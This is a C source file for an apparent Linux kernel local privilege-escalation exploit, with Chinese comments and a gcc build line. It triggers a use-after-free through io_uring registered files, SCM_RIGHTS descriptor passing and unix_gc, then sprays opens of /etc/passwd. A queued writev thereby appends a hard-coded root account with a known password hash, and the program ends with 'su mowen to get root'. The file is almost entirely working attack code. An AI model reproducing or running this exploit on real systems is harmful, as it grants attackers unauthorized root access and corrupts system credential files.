/* 
gcc test2.c -static -l:liburing.a -o ./exp_mowen -lpthread
*/
#define _GNU_SOURCE 
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include <stdlib.h>
#include <string.h>
#include<unistd.h>
#include<sys/mman.h>
#include<sys/socket.h>
#include<signal.h>
#include<pthread.h>
#include<linux/userfaultfd.h>
#include <sys/ioctl.h>
#include<syscall.h>
#include<poll.h>
#include <semaphore.h>
#include <sched.h>
#include<liburing.h>
#pragma pack(16)
#define __int64 long long
#define CLOSE printf("\033[0m\n");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define YELLOW printf("\033[33m");
#define _QWORD unsigned long
#define _DWORD unsigned int
#define _WORD unsigned short
#define _BYTE unsigned char
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_BLUE "\033[34m"
#define COLOR_DEFAULT "\033[0m"
#define showAddr(var)  dprintf(2, COLOR_GREEN "[*] %s -> %p\n" COLOR_DEFAULT, #var, var); 
#define logu(fmt, ...) dprintf(2,  "[$] " fmt "\n" , ##__VA_ARGS__)
#define logd(fmt, ...) dprintf(2, COLOR_BLUE "[*] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)
#define debug(fmt, ...)                      \
    do {                                     \
        loge(fmt, ##__VA_ARGS__);            \
        loge("debug at line %d", __LINE__);  \
        getchar();                           \
    } while (0)
   
int stat_write;// 0(开始写之前) 、1(正在写)、2(写完成)
struct io_uring ring;

void binary_dump(char *desc, void *addr, int len);
/*  发送文件描述符
    @s: socket文件描述符
    @fd: 文件描述符
*/
int sendfd(int s,int fd){
    struct msghdr msg;// 信息头结构
    struct cmsghdr * cmsg; // 控制信息头（controlmsg）
    char buf[4096];
    int fds[1]={ fd };
    // 分配msg操作空间
    memset(&msg,0,sizeof(msg));
    memset(buf,0,sizeof(buf));

    msg.msg_control=buf;
    msg.msg_controllen=sizeof(buf);

    // 赋值操作空间
    cmsg=CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level=SOL_SOCKET;
    cmsg->cmsg_type=SCM_RIGHTS;
    cmsg->cmsg_len=CMSG_LEN(sizeof(fds));
    memcpy(CMSG_DATA(cmsg),fds,sizeof(fds));

    // 更新msg长度
    msg.msg_controllen=CMSG_SPACE(sizeof(fds));
    // 使用 sendmsg 发送消息（flags=0 表示默认行为）
    return sendmsg(s,&msg,0);
    
}

// 写 (0x80000 * 0x1000) 字节到 "/tmp/mowen"
void* slow_write(){
    puts("[slow_write] 开始慢速写 ————>> 占inode锁");

    int fd=open("/tmp/mowen",O_RDWR);
    if(fd<0) die("[slow_write] open failed");

    size_t buf_len=0x80000/0x20*0x1000;

    size_t* addr=mmap(0,buf_len,PROT_READ|PROT_WRITE,
                    MAP_ANONYMOUS|MAP_PRIVATE,0,0);
    if(addr<0)die("[slow_write] mmap failed");
    logi("[slow_write] mmap addr -> %p",addr);

    memcpy(addr,"mowen",5);
    
    struct iovec iov[20];
    for (size_t i = 0; i < 20; i++)
    {
        iov[i].iov_base=addr;
        iov[i].iov_len=buf_len;
    }
    
    stat_write=1;

    if(writev(fd,iov,20)<0){
        logw("[!] slow write");
    }

    stat_write=2;
    puts("[slow_write] write done ");
    close(fd);
    sleep(10);
    exit(0);
}

void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    BLUE;printf("[*] bind_cpu(%d)",core);CLOSE;
}

int main(void){ 
//账号：mowen , 密码： mowen
    static char hacker_buf[]="mowen:$1$mowen$8LVoOtcEpkRKrOBeMi9h80:0:0:/root:/root:/bin/sh\n";
    int io_fd,file_fd;
    int s[2],rfd[2];
    pthread_t t;
    int ret,orig_size;
    struct stat st;
    struct iovec iov[1];
    struct io_uring_sqe* sqe;
    stat_write=0;

    BLUE;puts("[*]start");CLOSE;
    bind_cpu(0);

    stat("/etc/passwd",&st);
    orig_size=st.st_size;
    logi("/etc/passwd size -> %d",orig_size);

    logu("step 1 -> 申请一对 `socket` ");
    socketpair(AF_UNIX,SOCK_DGRAM,0,s);

    logu("step 2 -> 注册 io_uring ");
    // 使用SQ轮询
    
    ret=io_uring_queue_init(32,&ring,IORING_SETUP_SQPOLL);
    sqe=io_uring_get_sqe(&ring);
    if(ret<0 || sqe< 0){
        logw("failed -> io_uring_queue_init or io_uring_get_sqe");
    }
    io_fd=ring.ring_fd;
    logi("io_fd -> %d",io_fd);

    logu("step 3、4 -> 打开文件并注册 s[1]、file_fd ");
    file_fd=open("/tmp/mowen",O_RDWR|O_APPEND|O_CREAT,0644);
    //rfd { s[1] , file_fd } 这里必须要使用这个顺序
    rfd[0]=s[1];// 注册 s[1],后面要使用s[0]往 s[1] 发送 io_fd
    rfd[1]=file_fd;
    io_uring_register_files(&ring,rfd,2);
    // 注册好之后 s[1]和file_fd 同属一个 skb
    /*
        s[0]    : ref_count = 1
        s[1]    : ref_count = 2 , inflight =1
        file_fd : ref_count = 2
        io_fd   : ref_count = 1  
        io_uring.sk_recvive_queue -> rfd {s[1], file_fd}
    */
    logu("step 5 -> 关闭file_fd");
    close(file_fd);

    // 关闭 file_fd : 引用计数 1，暂时不会被释放
    // s[0] —————— >     io_fd      ———————>  s[1] ,通过s[0]往s[1]发送io_fd
    // s[1]->sk->sk_receive_queue 会保留 io_fd
    logu("step 6 -> 发送 io_fd ");
    sendfd(s[0],io_fd);

    /*
        s[0]    : ref_count = 1
        s[1]    : ref_count = 2 , inflight =1
        file_fd : ref_count = 1
        io_fd   : ref_count = 2 , inflight =1
        io_uring.sk_recvive_queue -> rfd {s[1], file_fd}
        s[1].sk_receive_queue     -> io_fd  (s[1]未接受到io_fd，挂载sk_receive_queue)
    */

    logu("step 7 -> 关闭 s[0]/s[1] ");
    close(s[0]);
    close(s[1]);

    /*
        s[0]    : ref_count = 0 <——————> free
        s[1]    : ref_count = 1 , inflight =1
        file_fd : ref_count = 1
        io_fd   : ref_count = 2 , inflight =1
        io_uring.sk_recvive_queue -> rfd {s[1], file_fd}
        s[1].sk_receive_queue     -> io_fd  (s[1]未接受到io_fd，挂载sk_receive_queue)
    */
    logu("step 8 -> 启动slow_write，占inode ");
    pthread_create(&t,NULL,slow_write,NULL);
    sleep(1);//等待inode锁住，然后提交writev任务，提交恶意信息(新root)
    while (stat_write==0){}
    //启动slow_write后就会锁住inode，这个时候提交任务
    logu("step 9 -> 提交SEQ");
    iov[0].iov_base=hacker_buf;
    iov[0].iov_len=strlen(hacker_buf);
    // 设置SQE
    sqe->opcode = IORING_OP_WRITEV;
    sqe->fd = 1;
    sqe->addr = (long long)iov;
    sqe->len = 1;
    sqe->flags = IOSQE_FIXED_FILE;
    sleep(1);
    // 提交任务
    if(io_uring_submit(&ring)<0){
        die("failed io_uring_submit");
    }
    sleep(1);

    logu("step 10 -> 尝试触发 unix_gc() ");
    //关闭io_uring
    io_uring_queue_exit(&ring);
    close(socket(AF_UNIX, SOCK_DGRAM, 0));//触发unix_gc

    /*触发unix_gc
        s[0]    : ref_count = 0 <——————> free
        s[1]    : ref_count = 1 , inflight =1  <——————>  现在释放
        file_fd : ref_count = 1 <——————>  现在释放
        io_fd   : ref_count = 1 , inflight =1 <——————>  现在释放
        io_uring.sk_recvive_queue -> rfd {s[1], file_fd}
        s[1].sk_receive_queue     -> io_fd  
        非法释放 file_fd
    */

    logu("Spray /etc/passwd");
    for (int i = 0; i < 700; i++)
    {
        if(open("/etc/passwd",0)<0){
            loge("failed open at [%d]",i);
        }
    }

    logu("等待/etc/passwd被篡改");
    while (orig_size==st.st_size)
    {
       stat("/etc/passwd", &st);
       sleep(1);
    }
    
    logi("su mowen to get root");

    BLUE;puts("[*]end");CLOSE;
   return 0;
}







